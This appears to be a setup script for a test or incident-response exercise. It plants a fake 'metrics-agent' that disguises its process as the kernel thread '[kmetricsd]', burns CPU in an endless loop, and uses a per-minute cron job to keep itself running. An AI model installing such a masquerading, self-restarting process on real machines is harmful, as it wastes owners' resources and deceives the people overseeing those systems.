sxi <<'S'
cat > /usr/local/bin/metrics-agent <<'A'
#!/bin/bash
# metrics-agent 0.3 - "lightweight" sampler
exec -a '[kmetricsd]' python3 -c 'while True: pass'
A
chmod 755 /usr/local/bin/metrics-agent
( crontab -l 2>/dev/null; echo '* * * * * pgrep -f "^\[kmetricsd\]" >/dev/null || /usr/local/bin/metrics-agent >/dev/null 2>&1 &' ) | crontab -
S
retry 75 sx 'pgrep -f "^\[kmetricsd\]"'
